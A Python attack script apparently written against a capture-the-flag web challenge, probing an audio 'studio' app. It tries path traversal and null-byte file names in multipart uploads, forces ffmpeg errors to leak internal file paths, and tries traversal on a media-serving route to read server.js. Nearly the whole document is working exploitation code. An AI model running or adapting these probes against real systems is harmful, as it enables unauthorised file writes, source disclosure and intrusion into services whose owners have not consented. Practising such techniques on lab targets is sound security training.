#!/usr/bin/env python3
import io, json, re, urllib.request, urllib.error, http.cookiejar, struct, math

BASE = "https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
def sess():
    cj=http.cookiejar.CookieJar()
    o=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    o.addheaders=[("User-Agent","Mozilla/5.0")]; return o
op=sess()
def do(path, data=None, headers=None, method=None, o=None):
    o=o or op
    r=urllib.request.Request(BASE+path, data=data, method=method)
    for k,v in (headers or {}).items(): r.add_header(k,v)
    try:
        resp=o.open(r,timeout=40); return resp.status, dict(resp.getheaders()), resp.read()
    except urllib.error.HTTPError as e: return e.code, dict(e.headers), e.read()
    except Exception as e: return -1,{},str(e).encode()
def wav():
    n=8000; fr=b"".join(struct.pack("<h",int(4000*math.sin(2*math.pi*300*i/8000))) for i in range(n))
    return b"RIFF"+struct.pack("<I",36+len(fr))+b"WAVE"+b"fmt "+struct.pack("<IHHIIHH",16,1,1,8000,16000,2,16)+b"data"+struct.pack("<I",len(fr))+fr
def upload(fn, content=None, o=None):
    bd="----x"; body=io.BytesIO()
    body.write((f"--{bd}\r\nContent-Disposition: form-data; name=\"clip\"; filename=\"{fn}\"\r\nContent-Type: audio/wav\r\n\r\n").encode())
    body.write(content or wav()); body.write(f"\r\n--{bd}--\r\n".encode())
    return do("/studio/upload",data=body.getvalue(),headers={"Content-Type":f"multipart/form-data; boundary={bd}"},method="POST",o=o)
def render(o=None,**kw):
    st,h,b=do("/api/render",data=json.dumps(kw).encode(),headers={"Content-Type":"application/json"},method="POST",o=o)
    try: return json.loads(b)
    except: return b.decode('utf-8','replace')

print("===== robots.txt =====")
st,h,b=do("/robots.txt"); print(b.decode('utf-8','replace'))

print("\n===== exact output filename logic (slug -> outputs[].file/url) =====")
op=sess(); do("/studio"); upload("c.wav")
for slug in ["x","x.png","x.PNG","x.txt","x.svg","dir/y","a.png.png","..%2fp","z.","z ","CAP.png"]:
    j=render(slug=slug, theme="midnight")
    if isinstance(j,dict):
        outs=j.get("outputs"); print(f"  slug={slug!r:14} ok={j.get('ok')} file={outs[0]['file'] if outs else None!r} url={outs[0]['url'] if outs else None!r} err={(j.get('errors') or '')[:60]!r}")

print("\n===== upload multipart filename traversal (content-controlled write?) =====")
for fn in ["../../pwn.txt","..%2f..%2fpwn2.txt","/tmp/pwn3.txt","....//pwn4.txt","source.wav",
           "x.wav\x00.png"]:
    o=sess(); do("/studio",o=o)
    st,h,b=upload(fn, content=b"PWNCONTENT_"+fn.encode('utf-8','replace')+b"\n"+wav(), o=o)
    body=b.decode('utf-8','replace')
    chip=re.search(r'clip-chip.*?<span class="mono">([^<]*)</span>', body, re.S)
    # then render normal and read the leaked input path in errors (force error via bad slug ':')
    j=render(slug="a:b", theme="midnight", o=o)
    err=j.get("errors","") if isinstance(j,dict) else str(j)
    inp=re.search(r"Input #0.*?from '([^']+)'", err, re.S) or re.search(r"(/opt/app/media/[^:']+source[^:'\n ]*)", err)
    print(f"  fn={fn!r:22} status={st} chip={chip.group(1) if chip else None!r} ffmpeg_input={inp.group(1) if inp else '??'}")

print("\n===== serve route: traversal in the <ws> segment =====")
op=sess(); do("/studio"); upload("c.wav"); j=render(slug="poster",theme="midnight")
ws=j["outputs"][0]["url"].split("/")[2]
print("my ws:",ws)
for u in [f"/m/{ws}/poster.png", f"/m/..%2f{ws}/poster.png", f"/m/{ws}%2f..%2f{ws}/poster.png",
          "/m/..%2f..%2fserver.js/x", f"/m/{ws}/../poster.png","/m/%2e%2e/poster.png",
          f"/m/{ws}/....//poster.png"]:
    st,h,b=do(u); print(f"  {u:40} -> {st} len={len(b)} ct={h.get('Content-Type','')[:20]}")
print("\nDONE")
